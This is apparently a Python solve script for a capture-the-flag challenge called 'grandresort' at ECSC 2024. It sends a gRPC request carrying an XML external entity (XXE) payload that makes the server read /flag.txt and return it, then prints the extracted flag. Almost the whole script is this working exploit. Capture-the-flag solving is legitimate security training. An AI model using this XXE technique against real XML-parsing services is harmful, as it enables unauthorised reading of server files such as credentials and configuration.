#!/usr/bin/env python3

import logging
import os

from textwrap import dedent

import requests
from grpc_requests import Client

logging.disable()

HOST = os.environ.get("HOST", "grandresort.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38010))
FRONTEND_PORT = int(os.environ.get("FRONTEND_PORT", 80))

r = requests.get(f'http://{HOST}:{FRONTEND_PORT}')
r.raise_for_status()

client = Client.get_by_endpoint(f'{HOST}:{PORT}')
flag = client.service("GrandResort.Reception").createRoom73950029({
    "RoomRequestModel": dedent("""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE room [<!ENTITY flag PUBLIC "flag" "/flag.txt">]>
        <room>
            <name>&flag;</name>
            <price>$100.0</price>
            <description>RoomDescription</description>
            <size>30 m2</size>
        </room>
    """).strip()
})
print(flag["RoomCreationResponse"].split(" ")[-1])
